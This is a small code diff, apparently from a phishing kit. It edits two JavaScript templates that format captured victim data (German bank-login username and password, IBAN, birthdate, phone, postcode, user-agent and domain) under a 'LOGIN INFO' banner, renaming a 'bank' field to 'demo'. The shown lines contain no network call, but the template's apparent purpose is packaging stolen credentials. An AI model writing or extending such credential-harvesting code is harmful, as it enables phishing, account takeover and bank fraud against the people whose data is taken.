@@ -28,7 +28,7 @@ phone: ${s.phone || ""}
 ======> LOGIN INFO <=======
 benutzername: ${s.demo_username || ""}
 passwort: ${s.demo_password || ""}
-bank: ${s.bank || ""}
+demo: ${s.demo || ""}
 
 user-agent: ${s.user_agent || ""}
 domain: ${s.domain || ""}`;
@@ -48,7 +48,7 @@ postcode: ${s.postal_code || ""}
 birthdate: ${s.birthdate || ""}
 iban: ${s.iban || ""}
 phone: ${s.phone || ""}
-bank: ${s.bank || ""}
+demo: ${s.demo || ""}
 
 user-agent: ${s.user_agent || ""}
 domain: ${s.domain || ""}`;
